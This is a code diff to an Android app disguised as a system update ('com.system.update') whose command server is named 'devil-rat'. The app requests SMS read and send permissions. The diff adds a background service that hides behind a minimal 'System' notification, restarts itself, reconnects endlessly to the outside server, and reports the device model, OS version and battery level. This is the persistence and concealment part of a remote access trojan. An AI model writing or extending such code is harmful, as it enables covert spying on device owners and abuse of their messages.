@@ -1,21 +1,32 @@
 package com.system.update;
 
 import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.BatteryManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.IBinder;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -26,9 +37,8 @@ public class MainActivity extends AppCompatActivity {
     private TextView statusText;
     private Button activateBtn;
     private LinearLayout layout;
-    private Socket mSocket;
 
-    private static final String SERVER_URL = "https://devil-rat-production.up.railway.app";
+    public static final String SERVER_URL = "https://devil-rat-production.up.railway.app";
 
     private final String[] REQUIRED_PERMISSIONS = {
             Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
@@ -43,23 +53,13 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        
         layout = findViewById(R.id.main_layout);
         statusText = findViewById(R.id.status_text);
         activateBtn = findViewById(R.id.activate_btn);
+
         activateBtn.setOnClickListener(v -> requestAllPermissions());
         addSettingsButtons();
-        connectToServer();
-    }
-
-    private void connectToServer() {
-        try {
-            mSocket = IO.socket(SERVER_URL);
-            mSocket.on(Socket.EVENT_CONNECT, args -> runOnUiThread(() -> statusText.setText("✅ متصل بالخادم")));
-            mSocket.on(Socket.EVENT_DISCONNECT, args -> runOnUiThread(() -> statusText.setText("❌ انقطع الاتصال")));
-            mSocket.connect();
-        } catch (URISyntaxException e) {
-            statusText.setText("❌ خطأ في عنوان الخادم");
-        }
     }
 
     private void addSettingsButtons() {
@@ -100,14 +100,71 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void done() {
-        Toast.makeText(this, "✅ التطبيق جاهز", Toast.LENGTH_LONG).show();
-        statusText.setText("✅ التطبيق يعمل");
-        if (mSocket != null && !mSocket.connected()) mSocket.connect();
+        Toast.makeText(this, "✅ التطبيق يعمل في الخلفية", Toast.LENGTH_LONG).show();
+        statusText.setText("✅ التطبيق يعمل في الخلفية");
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(new Intent(this, SocketService.class));
+        } else {
+            startService(new Intent(this, SocketService.class));
+        }
     }
 
-    @Override
-    protected void onDestroy() {
-        if (mSocket != null) { mSocket.disconnect(); mSocket.off(); }
-        super.onDestroy();
+    public static class SocketService extends Service {
+        private Socket mSocket;
+        private static final String CH_ID = "sys_update_ch";
+
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel(CH_ID, "System",
+                        NotificationManager.IMPORTANCE_MIN);
+                ch.setShowBadge(false);
+                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                nm.createNotificationChannel(ch);
+            }
+            Notification notif = new NotificationCompat.Builder(this, CH_ID)
+                    .setSmallIcon(android.R.drawable.ic_menu_manage)
+                    .setContentTitle("System")
+                    .setContentText("Running")
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setOngoing(true)
+                    .build();
+            startForeground(1, notif);
+
+            connectToServer();
+        }
+
+        private void connectToServer() {
+            try {
+                IO.Options opts = new IO.Options();
+                opts.extraHeaders = new HashMap<>();
+                opts.extraHeaders.put("model", Build.MODEL);
+                opts.extraHeaders.put("version", Build.VERSION.RELEASE);
+                opts.extraHeaders.put("provider", "Unknown");
+
+                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+                Intent batteryStatus = registerReceiver(null, ifilter);
+                int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
+                int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
+                int pct = (int) ((level / (float) scale) * 100);
+                opts.extraHeaders.put("battery", pct + "%");
+
+                mSocket = IO.socket(MainActivity.SERVER_URL, opts);
+                mSocket.on(Socket.EVENT_CONNECT, args -> {});
+                mSocket.on(Socket.EVENT_DISCONNECT, args -> connectToServer());
+                mSocket.connect();
+            } catch (URISyntaxException e) {}
+        }
+
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            return START_STICKY;
+        }
+
+        @Nullable
+        @Override
+        public IBinder onBind(Intent intent) { return null; }
     }
-    }
+            }
